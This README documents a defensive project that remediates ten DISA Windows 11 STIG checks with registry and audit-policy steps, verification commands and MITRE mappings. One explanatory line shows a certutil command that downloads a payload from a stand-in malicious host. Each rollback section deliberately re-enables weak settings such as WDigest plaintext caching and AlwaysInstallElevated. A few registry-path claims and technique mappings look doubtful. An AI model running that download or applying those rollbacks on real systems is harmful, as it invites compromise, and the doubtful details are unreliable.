# Windows 11 STIG Remediation Project

**Author:** Your Name
**LinkedIn:** https://linkedin.com/in/yourprofile
**GitHub:** https://github.com/yourgithub
**Environment:** Windows 11 Azure VM — DISA STIG v2r2
**Scan Tool:** Tenable Nessus (cloud.tenable.com)

---

## Overview

This project documents the end-to-end process of identifying, manually remediating, and automating fixes for 10 failed DISA Windows 11 STIG compliance checks on a Microsoft Azure VM.

The 10 STIGs were selected based on direct relevance to SOC operations, threat hunting, and credential security. Each STIG maps to a real attack technique that SOC analysts encounter in production environments.

For each STIG the following process was followed:

1. Identified as Failed in a Tenable Nessus baseline compliance scan
2. Fixed manually via Registry Editor or Local Security Policy
3. Verified as Passed via Tenable rescan
4. Reverted to confirm it fails again (proof of before/after)
5. Fixed again using a PowerShell automation script
6. Verified as Passed via final rescan
7. Documented with full evidence screenshots

---

## Environment

| Component | Details |
|-----------|---------|
| Operating System | Windows 11 |
| STIG Baseline | DISA Windows 11 STIG v2r2 |
| Scan Tool | Tenable Nessus (cloud.tenable.com) |
| VM Platform | Microsoft Azure |
| Scan Engine | LOCAL-SCAN-ENGINE-01 |
| Baseline Result | 151 Failed / 13 Warning / 100 Passed |

---

## Baseline Scan

Initial Tenable Nessus compliance scan before any remediation was performed. This establishes the starting state of the system.

> Screenshot: `evidence/baseline-scan.png`

---

## MITRE ATT&CK Mapping

Each STIG in this project maps directly to a real attack technique:

| STIG ID | MITRE Technique | Tactic |
|---------|----------------|--------|
| WN11-AU-000500 | T1070.001 — Indicator Removal: Clear Windows Event Logs | Defense Evasion |
| WN11-AU-000505 | T1070.001 — Indicator Removal: Clear Windows Event Logs | Defense Evasion |
| WN11-AU-000510 | T1070.001 — Indicator Removal: Clear Windows Event Logs | Defense Evasion |
| WN11-CC-000326 | T1059.001 — Command and Scripting: PowerShell | Execution |
| WN11-CC-000327 | T1059.001 — Command and Scripting: PowerShell | Execution |
| WN11-CC-000066 | T1059.003 — Command and Scripting: Windows Command Shell | Execution |
| WN11-CC-000038 | T1003.001 — OS Credential Dumping: LSASS Memory | Credential Access |
| WN11-SO-000205 | T1557.001 — LLMNR/NBT-NS Poisoning and Relay | Credential Access |
| WN11-AU-000050 | T1055 — Process Injection | Defense Evasion |
| WN11-CC-000315 | T1548.002 — Abuse Elevation Control Mechanism | Privilege Escalation |

---

## STIGs Remediated

### Group 1 — Event Log Sizes

| STIG ID | Title | Script |
|---------|-------|--------|
| WN11-AU-000500 | Application event log size must be 32768 KB or greater | [WN11-AU-EventLog-Sizes.ps1](scripts/WN11-AU-EventLog-Sizes.ps1) |
| WN11-AU-000505 | Security event log size must be 1024000 KB or greater | [WN11-AU-EventLog-Sizes.ps1](scripts/WN11-AU-EventLog-Sizes.ps1) |
| WN11-AU-000510 | System event log size must be 32768 KB or greater | [WN11-AU-EventLog-Sizes.ps1](scripts/WN11-AU-EventLog-Sizes.ps1) |

### Group 2 — PowerShell and Command Logging

| STIG ID | Title | Script |
|---------|-------|--------|
| WN11-CC-000326 | PowerShell Script Block Logging must be enabled | [WN11-CC-PowerShell-Logging.ps1](scripts/WN11-CC-PowerShell-Logging.ps1) |
| WN11-CC-000327 | PowerShell Transcription must be enabled | [WN11-CC-PowerShell-Logging.ps1](scripts/WN11-CC-PowerShell-Logging.ps1) |
| WN11-CC-000066 | Command line data must be included in process creation events | [WN11-CC-PowerShell-Logging.ps1](scripts/WN11-CC-PowerShell-Logging.ps1) |

### Group 3 — Credential Security

| STIG ID | Title | Script |
|---------|-------|--------|
| WN11-CC-000038 | WDigest Authentication must be disabled | [WN11-CC-Credential-Security.ps1](scripts/WN11-CC-Credential-Security.ps1) |
| WN11-SO-000205 | LanMan authentication level must be NTLMv2 only | [WN11-CC-Credential-Security.ps1](scripts/WN11-CC-Credential-Security.ps1) |

### Group 4 — Process Auditing

| STIG ID | Title | Script |
|---------|-------|--------|
| WN11-AU-000050 | Audit Detailed Tracking — Process Creation must be enabled | [WN11-AU-ProcessCreation.ps1](scripts/WN11-AU-ProcessCreation.ps1) |

### Group 5 — Installer Privileges

| STIG ID | Title | Script |
|---------|-------|--------|
| WN11-CC-000315 | Windows Installer Always install with elevated privileges must be disabled | [WN11-CC-InstallerElevated.ps1](scripts/WN11-CC-InstallerElevated.ps1) |

---

## Detailed Remediation

---

### WN11-AU-000500 — Application Event Log Size

**STIG Requirement:** Application event log size must be configured to 32768 KB or greater.

**Why This Matters:**
The Application event log records errors, warnings, and informational events from applications running on the system. When the log size is too small it fills up quickly and starts overwriting older entries. During a security incident SOC analysts need historical log data to reconstruct what happened. If the log has overwritten itself that evidence is permanently gone. Attackers rely on small log sizes to naturally erase their tracks without having to actively clear logs.

**Registry Path Explanation:**
This fix uses the Group Policy registry path (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog`) rather than the direct service path (`HKLM:\SYSTEM\CurrentControlSet\Services\EventLog`). The GPO path takes priority over local settings and is what Tenable checks for compliance.

**MITRE ATT&CK:** T1070.001 — Indicator Removal: Clear Windows Event Logs

**Manual Remediation Steps:**

1. Press `Windows + R` on your keyboard to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC (User Account Control) prompt to allow Registry Editor to open
4. In the left panel of Registry Editor, expand the following path by clicking each folder:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
   - `EventLog`
5. If the `EventLog` key does not exist, right click `Windows` → click `New` → click `Key` → type `EventLog` → press `Enter`
6. Right click the `EventLog` key → click `New` → click `Key` → type `Application` → press `Enter`
7. If the `Application` key already exists, click on it to select it
8. In the right panel, look for a value named `MaxSize`
9. If `MaxSize` does not exist, right click in the right panel → click `New` → click `DWORD (32-bit) Value` → type `MaxSize` → press `Enter`
10. Double click `MaxSize` to open the Edit dialog
11. Select `Decimal` under Base
12. In the Value data field, type `32768`
13. Click `OK`
14. Close Registry Editor

**Verification Steps:**
1. Open PowerShell as Administrator
2. Run the following command:
   ```powershell
   Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Application" | Select MaxSize
   ```
3. Confirm the output shows `MaxSize : 32768`

**Rollback Steps (to restore failed state for testing):**
1. Open Registry Editor (`regedit`)
2. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\EventLog\Application`
3. Double click `MaxSize`
4. Select `Decimal`
5. Change value back to `20480`
6. Click `OK`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-AU-EventLog-Sizes.ps1
```

**Evidence:**
- Before: `evidence/WN11-AU-000500-failed.png`
- After: `evidence/WN11-AU-000500-passed.png`

---

### WN11-AU-000505 — Security Event Log Size

**STIG Requirement:** Security event log size must be configured to 1024000 KB or greater.

**Why This Matters:**
The Security event log is the most critical log for SOC analysts. It records every login attempt, every privilege use, every account change, and every policy change on the system. The default size is only 20MB which fills up in hours on a busy system. Attackers performing password spraying or brute force generate thousands of failed login events. If the log fills up and overwrites itself before SOC investigates the evidence of the attack is gone. A 1GB Security log provides days of retention.

**Registry Path Explanation:**
Uses the GPO path (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Security`) which Tenable checks for compliance verification.

**MITRE ATT&CK:** T1070.001 — Indicator Removal: Clear Windows Event Logs

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand the following path:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
   - `EventLog`
5. If the `EventLog` key does not exist, right click `Windows` → `New` → `Key` → type `EventLog` → press `Enter`
6. Right click `EventLog` → `New` → `Key` → type `Security` → press `Enter`
7. If `Security` already exists click on it to select it
8. In the right panel look for `MaxSize`
9. If it does not exist, right click in the right panel → `New` → `DWORD (32-bit) Value` → type `MaxSize` → press `Enter`
10. Double click `MaxSize`
11. Select `Decimal`
12. Type `1024000`
13. Click `OK`
14. Close Registry Editor

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Security" | Select MaxSize
```
Confirm output shows `MaxSize : 1024000`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\EventLog\Security`
2. Double click `MaxSize` → Decimal → change to `20480` → OK

**PowerShell Remediation:**
```powershell
.\scripts\WN11-AU-EventLog-Sizes.ps1
```

**Evidence:**
- Before: `evidence/WN11-AU-000505-failed.png`
- After: `evidence/WN11-AU-000505-passed.png`

---

### WN11-AU-000510 — System Event Log Size

**STIG Requirement:** System event log size must be configured to 32768 KB or greater.

**Why This Matters:**
The System log records service starts and stops, driver loading failures, and system-level errors. Attackers frequently stop security services like Windows Defender or the Windows Event Log service itself. Without enough log retention SOC analysts cannot determine when a security service was disabled or what sequence of events led to the disable. This is critical for accurate incident timelines.

**Registry Path Explanation:**
Uses the GPO path (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\System`) for Tenable compliance verification.

**MITRE ATT&CK:** T1070.001 — Indicator Removal: Clear Windows Event Logs

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
   - `EventLog`
5. If `EventLog` does not exist, right click `Windows` → `New` → `Key` → type `EventLog` → press `Enter`
6. Right click `EventLog` → `New` → `Key` → type `System` → press `Enter`
7. If `System` already exists click on it to select it
8. In the right panel look for `MaxSize`
9. If it does not exist, right click in the right panel → `New` → `DWORD (32-bit) Value` → type `MaxSize` → press `Enter`
10. Double click `MaxSize`
11. Select `Decimal`
12. Type `32768`
13. Click `OK`
14. Close Registry Editor

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\System" | Select MaxSize
```
Confirm output shows `MaxSize : 32768`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\EventLog\System`
2. Double click `MaxSize` → Decimal → change to `20480` → OK

**PowerShell Remediation:**
```powershell
.\scripts\WN11-AU-EventLog-Sizes.ps1
```

**Evidence:**
- Before: `evidence/WN11-AU-000510-failed.png`
- After: `evidence/WN11-AU-000510-passed.png`

---

### WN11-CC-000326 — PowerShell Script Block Logging

**STIG Requirement:** PowerShell Script Block Logging must be enabled on Windows 11.

**Why This Matters:**
PowerShell is used in the majority of modern cyberattacks. Attackers use it to download malware, run code entirely in memory without touching the disk, and bypass antivirus. Script block logging records every PowerShell script that executes including base64 encoded and obfuscated commands. Windows automatically decodes these and logs the actual content. SOC analysts and threat hunters rely on script block logs to understand what PowerShell-based malware actually did on a system.

**Registry Path Explanation:**
The setting is applied under the Group Policy PowerShell path (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`). This key and its parent may not exist by default on Windows 11 and must be created.

**MITRE ATT&CK:** T1059.001 — Command and Scripting Interpreter: PowerShell

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
5. Right click `Windows` → `New` → `Key` → type `PowerShell` → press `Enter`
6. If `PowerShell` already exists click on it to expand it
7. Right click `PowerShell` → `New` → `Key` → type `ScriptBlockLogging` → press `Enter`
8. Click on `ScriptBlockLogging` to select it
9. In the right panel right click → `New` → `DWORD (32-bit) Value` → type `EnableScriptBlockLogging` → press `Enter`
10. Double click `EnableScriptBlockLogging`
11. Select `Decimal`
12. Type `1`
13. Click `OK`
14. Close Registry Editor
15. Open PowerShell as Administrator and run:
    ```powershell
    gpupdate /force
    ```

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" | Select EnableScriptBlockLogging
```
Confirm output shows `EnableScriptBlockLogging : 1`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`
2. Double click `EnableScriptBlockLogging` → Decimal → change to `0` → OK
3. Run `gpupdate /force`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-CC-PowerShell-Logging.ps1
```

**Evidence:**
- Before: `evidence/WN11-CC-000326-failed.png`
- After: `evidence/WN11-CC-000326-passed.png`

---

### WN11-CC-000327 — PowerShell Transcription Logging

**STIG Requirement:** PowerShell Transcription must be enabled on Windows 11.

**Why This Matters:**
While script block logging records individual scripts, transcription logging records the entire PowerShell session — every command typed by the user or attacker and every output returned by the system. The transcript is saved as a plain text file. SOC analysts can open the transcript file and read exactly what happened during a PowerShell session as if they were watching it live. This is especially valuable during incident response when investigators need to understand attacker actions after the fact.

**Registry Path Explanation:**
Applied under (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription`). This key may not exist by default and must be created alongside its parent PowerShell key.

**MITRE ATT&CK:** T1059.001 — Command and Scripting Interpreter: PowerShell

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
   - `PowerShell`
5. If `PowerShell` does not exist, right click `Windows` → `New` → `Key` → type `PowerShell` → press `Enter`
6. Right click `PowerShell` → `New` → `Key` → type `Transcription` → press `Enter`
7. If `Transcription` already exists click on it to select it
8. In the right panel right click → `New` → `DWORD (32-bit) Value` → type `EnableTranscripting` → press `Enter`
9. Double click `EnableTranscripting`
10. Select `Decimal`
11. Type `1`
12. Click `OK`
13. Close Registry Editor
14. Run `gpupdate /force` in an elevated PowerShell window

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" | Select EnableTranscripting
```
Confirm output shows `EnableTranscripting : 1`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription`
2. Double click `EnableTranscripting` → Decimal → change to `0` → OK
3. Run `gpupdate /force`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-CC-PowerShell-Logging.ps1
```

**Evidence:**
- Before: `evidence/WN11-CC-000327-failed.png`
- After: `evidence/WN11-CC-000327-passed.png`

---

### WN11-CC-000066 — Command Line in Process Creation Events

**STIG Requirement:** Command line data must be included in process creation events on Windows 11.

**Why This Matters:**
Without this setting Windows logs that a process started but not what arguments it ran with. Event ID 4688 only shows the process name. With this setting enabled the full command line is included in the event. This is critical for detecting living-off-the-land attacks where adversaries use legitimate built-in Windows tools with malicious arguments. For example seeing `certutil.exe` start is normal but seeing `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` is a clear indicator of compromise.

**Registry Path Explanation:**
Applied under (`HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit`). Note this uses the direct system path rather than the GPO Policies path. The `Audit` subkey may not exist and must be created.

**MITRE ATT&CK:** T1059.003 — Command and Scripting Interpreter: Windows Command Shell

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Microsoft`
   - `Windows`
   - `CurrentVersion`
   - `Policies`
   - `System`
5. Right click `System` → `New` → `Key` → type `Audit` → press `Enter`
6. If `Audit` already exists click on it to select it
7. In the right panel right click → `New` → `DWORD (32-bit) Value` → type `ProcessCreationIncludeCmdLine_Enabled` → press `Enter`
8. Double click `ProcessCreationIncludeCmdLine_Enabled`
9. Select `Decimal`
10. Type `1`
11. Click `OK`
12. Close Registry Editor
13. Run `gpupdate /force` in an elevated PowerShell window

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" | Select ProcessCreationIncludeCmdLine_Enabled
```
Confirm output shows `ProcessCreationIncludeCmdLine_Enabled : 1`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit`
2. Double click `ProcessCreationIncludeCmdLine_Enabled` → Decimal → change to `0` → OK
3. Run `gpupdate /force`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-CC-PowerShell-Logging.ps1
```

**Evidence:**
- Before: `evidence/WN11-CC-000066-failed.png`
- After: `evidence/WN11-CC-000066-passed.png`

---

### WN11-CC-000038 — WDigest Authentication Disabled

**STIG Requirement:** WDigest Authentication must be disabled on Windows 11.

**Why This Matters:**
WDigest is a legacy authentication protocol that stores the user's plaintext password in memory inside the LSASS (Local Security Authority Subsystem Service) process. Tools like Mimikatz can dump this plaintext password from memory in seconds. Once an attacker has the plaintext password they can authenticate to any system that account has access to without needing to crack anything. Disabling WDigest means no plaintext password is stored in LSASS memory — credential dumping tools retrieve nothing useful.

**Registry Path Explanation:**
This fix uses the GPO path (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\WDigest`) which is what Tenable checks for compliance. Setting it at the direct path (`HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`) alone is not sufficient for this STIG to pass.

**MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
5. Right click `Windows` → `New` → `Key` → type `WDigest` → press `Enter`
6. If `WDigest` already exists click on it to select it
7. In the right panel right click → `New` → `DWORD (32-bit) Value` → type `UseLogonCredential` → press `Enter`
8. Double click `UseLogonCredential`
9. Select `Decimal`
10. Type `0`
11. Click `OK`
12. Close Registry Editor
13. Open an elevated PowerShell window and run:
    ```powershell
    gpupdate /force
    ```
14. Restart the system for the WDigest change to take full effect:
    ```powershell
    Restart-Computer -Force
    ```

**Note:** A system restart is required for WDigest changes to fully apply. The LSASS process must restart to stop caching plaintext credentials.

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WDigest" | Select UseLogonCredential
```
Confirm output shows `UseLogonCredential : 0`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\WDigest`
2. Double click `UseLogonCredential` → Decimal → change to `1` → OK
3. Run `gpupdate /force`
4. Restart the system

**PowerShell Remediation:**
```powershell
.\scripts\WN11-CC-Credential-Security.ps1
```

**Evidence:**
- Before: `evidence/WN11-CC-000038-failed.png`
- After: `evidence/WN11-CC-000038-passed.png`

---

### WN11-SO-000205 — LanMan Authentication NTLMv2 Only

**STIG Requirement:** The LanMan authentication level must be set to send NTLMv2 response only and to refuse LM and NTLM.

**Why This Matters:**
LM (LAN Manager) and NTLMv1 are legacy authentication protocols with serious security weaknesses. LM hashes can be cracked in seconds with modern hardware. NTLMv1 responses are vulnerable to relay attacks where an attacker captures an authentication response and replays it to another server to gain unauthorized access. Forcing NTLMv2 only makes relay attacks significantly harder and makes offline hash cracking impractical for strong passwords.

**Registry Path Explanation:**
Applied directly under the LSA (Local Security Authority) key (`HKLM:\SYSTEM\CurrentControlSet\Control\Lsa`). The `LmCompatibilityLevel` value controls which authentication protocols Windows will use and accept.

**MITRE ATT&CK:** T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and Relay

**LmCompatibilityLevel Values:**

| Value | Behavior |
|-------|----------|
| 0 | Send LM and NTLM — never NTLMv2 |
| 1 | Send LM and NTLM — use NTLMv2 if negotiated |
| 2 | Send NTLM only |
| 3 | Send NTLMv2 only |
| 4 | Send NTLMv2 — refuse LM |
| 5 | Send NTLMv2 — refuse LM and NTLM (STIG required) |

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SYSTEM`
   - `CurrentControlSet`
   - `Control`
   - `Lsa`
5. Click on `Lsa` to select it
6. In the right panel look for `LmCompatibilityLevel`
7. If it does not exist, right click in the right panel → `New` → `DWORD (32-bit) Value` → type `LmCompatibilityLevel` → press `Enter`
8. Double click `LmCompatibilityLevel`
9. Select `Decimal`
10. Type `5`
11. Click `OK`
12. Close Registry Editor
13. Run `gpupdate /force` in an elevated PowerShell window

**Verification Steps:**
```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select LmCompatibilityLevel
```
Confirm output shows `LmCompatibilityLevel : 5`

**Rollback Steps:**
1. Navigate to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
2. Double click `LmCompatibilityLevel` → Decimal → change to `0` → OK
3. Run `gpupdate /force`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-CC-Credential-Security.ps1
```

**Evidence:**
- Before: `evidence/WN11-SO-000205-failed.png`
- After: `evidence/WN11-SO-000205-passed.png`

---

### WN11-AU-000050 — Audit Detailed Tracking — Process Creation

**STIG Requirement:** The system must be configured to audit Detailed Tracking — Process Creation successes and failures.

**Why This Matters:**
Every process that starts on the system generates a Windows Security Event ID 4688 when this audit policy is enabled. This lets SOC analysts and threat hunters reconstruct the full attack kill chain. When malware executes it creates child processes — for example a Word document spawning PowerShell, which then spawns cmd.exe, which then runs Mimikatz. Each step in this chain is captured as a 4688 event. Without this setting the entire process chain is invisible and incident response becomes significantly harder.

**MITRE ATT&CK:** T1055 — Process Injection

**Manual Remediation Steps:**

1. Press `Windows + R` to open the Run dialog
2. Type `secpol.msc` and press `Enter`
3. Click `Yes` on the UAC prompt to open Local Security Policy
4. In the left panel expand:
   - `Security Settings`
   - `Advanced Audit Policy Configuration`
   - `System Audit Policies - Local Group Policy Object`
   - `Detailed Tracking`
5. In the right panel double click `Audit Process Creation`
6. The Audit Process Creation Properties window opens
7. Check the box next to `Success`
8. Check the box next to `Failure`
9. Click `Apply`
10. Click `OK`
11. Close Local Security Policy
12. Open an elevated PowerShell window and run:
    ```powershell
    gpupdate /force
    ```

**Verification Steps:**
```powershell
auditpol /get /subcategory:"Process Creation"
```
Confirm output shows `Process Creation    Success and Failure`

**Rollback Steps:**
1. Open `secpol.msc`
2. Navigate to `Advanced Audit Policy Configuration` → `Detailed Tracking`
3. Double click `Audit Process Creation`
4. Uncheck both `Success` and `Failure`
5. Click Apply → OK
6. Run `gpupdate /force`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-AU-ProcessCreation.ps1
```

**Evidence:**
- Before: `evidence/WN11-AU-000050-failed.png`
- After: `evidence/WN11-AU-000050-passed.png`

---

### WN11-CC-000315 — Windows Installer Elevated Privileges Disabled

**STIG Requirement:** The Windows Installer feature Always install with elevated privileges must be disabled.

**Why This Matters:**
When AlwaysInstallElevated is enabled in both the machine and user registry locations any user regardless of privilege level can run an MSI installer file as SYSTEM — the highest privilege level on a Windows machine. Attackers create malicious MSI files that contain commands to add accounts to the Administrators group or install backdoors. This is a well documented privilege escalation technique in MITRE ATT&CK used by both threat actors and penetration testers. Disabling this setting means MSI files run with the current user's privileges only.

**Registry Path Explanation:**
This STIG requires both the machine policy path (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer`) and the user policy path (`HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer`) to be set to 0. If either path is missing or set to 1 the vulnerability exists and the STIG fails.

**MITRE ATT&CK:** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control

**Manual Remediation Steps:**

**Path 1 — Machine Policy (HKLM):**

1. Press `Windows + R` to open the Run dialog
2. Type `regedit` and press `Enter`
3. Click `Yes` on the UAC prompt
4. In the left panel expand:
   - `HKEY_LOCAL_MACHINE`
   - `SOFTWARE`
   - `Policies`
   - `Microsoft`
   - `Windows`
5. Right click `Windows` → `New` → `Key` → type `Installer` → press `Enter`
6. If `Installer` already exists click on it to select it
7. In the right panel right click → `New` → `DWORD (32-bit) Value` → type `AlwaysInstallElevated` → press `Enter`
8. Double click `AlwaysInstallElevated`
9. Select `Decimal`
10. Type `0`
11. Click `OK`

**Path 2 — User Policy (HKCU):**

12. In the left panel navigate to:
    - `HKEY_CURRENT_USER`
    - `SOFTWARE`
    - `Policies`
    - `Microsoft`
    - `Windows`
13. Right click `Windows` → `New` → `Key` → type `Installer` → press `Enter`
14. If `Installer` already exists click on it to select it
15. In the right panel right click → `New` → `DWORD (32-bit) Value` → type `AlwaysInstallElevated` → press `Enter`
16. Double click `AlwaysInstallElevated`
17. Select `Decimal`
18. Type `0`
19. Click `OK`
20. Close Registry Editor
21. Run `gpupdate /force` in an elevated PowerShell window

**Verification Steps:**
```powershell
$hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
$hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
Write-Host "HKLM: $hklm"
Write-Host "HKCU: $hkcu"
```
Confirm both values show `0`

**Rollback Steps:**
1. Navigate to `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
2. Double click `AlwaysInstallElevated` → Decimal → change to `1` → OK
3. Navigate to `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
4. Double click `AlwaysInstallElevated` → Decimal → change to `1` → OK
5. Run `gpupdate /force`

**PowerShell Remediation:**
```powershell
.\scripts\WN11-CC-InstallerElevated.ps1
```

**Evidence:**
- Before: `evidence/WN11-CC-000315-failed.png`
- After: `evidence/WN11-CC-000315-passed.png`

---

## How to Run All Scripts

```powershell
# Open PowerShell as Administrator on your Windows 11 VM

# Step 1 — Allow script execution for this session
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process

# Step 2 — Run all scripts in order

# Group 1 — Event Log Sizes
.\scripts\WN11-AU-EventLog-Sizes.ps1

# Group 2 — PowerShell and Command Logging
.\scripts\WN11-CC-PowerShell-Logging.ps1

# Group 3 — Credential Security
.\scripts\WN11-CC-Credential-Security.ps1

# Group 4 — Process Auditing
.\scripts\WN11-AU-ProcessCreation.ps1

# Group 5 — Installer Privileges
.\scripts\WN11-CC-InstallerElevated.ps1

# Step 3 — Apply all group policy changes
gpupdate /force

# Step 4 — Restart for WDigest changes to take full effect
Restart-Computer -Force
```

---

## Troubleshooting

**Script execution blocked:**
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process
```

**gpupdate access denied:**
Make sure PowerShell is running as Administrator. Right click PowerShell → Run as Administrator.

**STIG still failing after fix:**
Run `gpupdate /force` and restart the VM. Some registry changes require a full restart to be picked up by Tenable during rescan.

**Registry key does not exist:**
Right click the parent key → New → Key → name it exactly as shown in the path. Then create the DWORD value inside the new key.

**Tenable scan not showing updated results:**
Launch a new scan after applying fixes. Results from a previous scan will not update automatically.

---

## Repository Structure

```
Win11-STIG-Remediation/
├── README.md
├── scripts/
│   ├── WN11-AU-EventLog-Sizes.ps1
│   ├── WN11-CC-PowerShell-Logging.ps1
│   ├── WN11-CC-Credential-Security.ps1
│   ├── WN11-AU-ProcessCreation.ps1
│   └── WN11-CC-InstallerElevated.ps1
└── evidence/
    ├── baseline-scan.png
    ├── WN11-AU-000500-failed.png
    ├── WN11-AU-000500-passed.png
    ├── WN11-AU-000505-failed.png
    ├── WN11-AU-000505-passed.png
    ├── WN11-AU-000510-failed.png
    ├── WN11-AU-000510-passed.png
    ├── WN11-CC-000326-failed.png
    ├── WN11-CC-000326-passed.png
    ├── WN11-CC-000327-failed.png
    ├── WN11-CC-000327-passed.png
    ├── WN11-CC-000066-failed.png
    ├── WN11-CC-000066-passed.png
    ├── WN11-CC-000038-failed.png
    ├── WN11-CC-000038-passed.png
    ├── WN11-SO-000205-failed.png
    ├── WN11-SO-000205-passed.png
    ├── WN11-AU-000050-failed.png
    ├── WN11-AU-000050-passed.png
    ├── WN11-CC-000315-failed.png
    └── WN11-CC-000315-passed.png
```

---

## Notes

- All scripts must be run as Administrator
- WDigest changes (WN11-CC-000038) require a system restart to take full effect
- Scripts were tested on Windows 11 Version 10.0.22621
- Run `gpupdate /force` after applying any registry changes
- A fresh Tenable Nessus rescan is required after each fix to confirm compliance
- The GPO registry path takes priority over direct registry paths for Tenable compliance checks
